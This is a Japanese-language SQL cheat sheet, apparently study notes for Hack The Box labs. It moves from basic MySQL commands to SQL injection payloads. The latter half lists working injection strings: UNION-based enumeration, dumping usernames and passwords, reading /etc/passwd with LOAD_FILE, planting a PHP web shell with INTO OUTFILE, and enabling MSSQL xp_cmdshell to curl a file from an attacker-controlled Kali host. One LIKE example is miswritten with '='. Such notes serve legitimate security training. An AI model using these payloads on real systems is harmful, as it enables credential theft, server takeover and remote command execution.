# SQL
- SQLのcheat sheet。


## コマンド集
1. ユーザ名とパスワードを指定してDBへの認証を行う。このとき、-pの後ろに空白は必要ない。  
ただしここで-pによる認証を行うと.bash_historyファイルに平文でパスワードが保存される。なのでコマンドラインから直接入力するべきではない。
```.sql
mysql -u root -p<password>
```

2. ホストとポートを指定して認証を行う。
```.sql
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```

3. hogeという名前のDBを新規で作成する。
```.sql
CREATE DATABASE hoge;
```

4. DBの一覧を表示する。
```.sql
SHOW DATABASES;
```

5. DBを指定してそのDBとの対話セッションに入る。
```.sql
USE hoge;
```

6. loginsという名前のテーブルを新規で作成する。  
各列、つまりカラムは、見出しの名前(id等)とデータの型を記載する。(INTとか)  
ここでは4つの列を持っており、VARCHAR(100)で、100文字の文字列という意味になる。
```.sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```  
  
また、CREATE TABLEで新規でテーブルを作成するとき、プロパティを付与することで様々なオプションが可能。  
例として以下などがあり、NOT NULLをプロパティに含めると、必須のフィールドにNULLが含まれないようになったりする。
```.sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100) UNIQUE NOT NULL
    );
```

7. 現在のDBに格納されているテーブルを一覧表示する。
```.sql
SHOW TABLES;
```

8. テーブルを指定し、そのテーブルの構造とフィールド・データ型を一覧で表示する。
```.sql
DESCRIBE logins;
```

9. INSERT INTOステートメントによって、table_nameに新しいレコード(VALUES以降)を追加する。
```.sql
INSERT INTO table_name VALUES (1, 'admin', 'p@ssw0rd'...);
```

10. SELECTステートメントで、テーブルから全てのデータを取得する。
```.sql
SELECT * FROM table_name;
```

11. カラム(列のこと)を指定してtable_nameからデータを取得する。
```.sql
SELECT column1, column2 FROM table_name;
```

12. DROPステートメントで、サーバからloginsテーブルを削除する。
```.sql
DROP TABLE logins;
```

13. ALTERステートメントで、既存のloginsテーブルにnewColumnというカラムを追加する。
```.sql
ALTER TABLE logins ADD newColumn INT;
```

14. UPDATEステートメントで、特定の条件に基づいてテーブル内の特定のレコードを更新する。
```.sql
UPDATE table_name SET password = 'change_password' WHERE id > 1;
```

15. ORDER BYでpassword列を指定して並べ替える。
```.sql
SELECT * FROM table_name ORDER BY password;
```

16. WHEREで結果をフィルタする。
```.sql
SELECT * FROM table_name WHERE id > 1;
```

```.sql
SELECT * FROM table_name WHERE username = 'admin';
```

17. LIKEでWHEREによる条件指定をするときに、カラムに含まれる値を正規表現で指定できる。  
以下では、adminで始まる値あusernameカラムにあればそれを取得する。
```.sql
SELECT * FROM table_name WHERE username = 'admin%';
```

18. ()を使ってidのカラムが5のもののみを取得するSQLi
```.sql
') OR (id=5) -- 
```

19. UNION Injectionをするにあたり、ORDER BYによってテーブルのカラム数を特定する。  
ORDER BYの後ろの1は列宇数で、以下の場合だと1列目をソートしている。--の後ろの-は、--の後ろに空白を入れる必要があるのでそれを分かりやすくするために書いている。
```.sql
' ORDER BY 1 -- -
```

20. ORDER BYではなくUNIONによってUNION Injectionに使うカラム数を特定する。
```.sql
' UNION SELECT 1,2,3,4 -- -
```

21. UNIONでカラムが4つとわかった時、JUNKデータとして適当な数字ではなく、DBのバージョンとユーザ名を表示させる。
```.sql
' UNION SELECT 1,@@version,3,user() -- -
```

22. カラム名とテーブル名、データベース名をそれぞれ取得する。@@versionみたいなもの。
```.sql
' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'-- -
```

23. ilfreightというDBのusersというテーブルからusenameとpasswordというカラムを取得する。  
別のDB内のテーブルからデータを取得できるのがUNIONのメリット。
```.sql
' UNION SELECT 1, username, password, 4 from ilfreight.users -- -
```

24. UNIONを使って、ユーザ名を取得できる。
```.sql
' UNION SELECT 1, user(), 3, 4-- -
```

25. CURRENT_USER()を使えば現在のユーザ名を取得できる。
```.sql
' UNION SELECT 1, CURRENT_USER(), 3, 4-- -
```

26. LOAD_FILEを使ってファイルを読み取る。権限があるときだけ可能。
```.sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

27. secure_file_privをチェックして書き込み権限があるかをチェックする。
```.sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

28. INTO OUTFILEで指定した場所にfrom usersの結果を書き込む。
```.sql
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

29. 任意の値をOUTFILEで指定した場所に書き込む。
```.sql
SELECT 'hogehoge' INTO OUTFILE '/tmp/test.txt';
```

30. PHPのwebshellを書き込む。
```.sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

31. MSSQLでRCEを実行できるようにするための設定をWebからおこなってコマンド実行
```
 ' EXECUTE sp_configure "show advanced option", 1; RECONFIGURE; -- -
 ' EXECUTE sp_configure "xp_cmdshell", 1; RECONFIGURE; --
 ' EXECUTE xp_cmdshell "curl <Kali IP> -o C:\Users\Public\test" ; --
 ```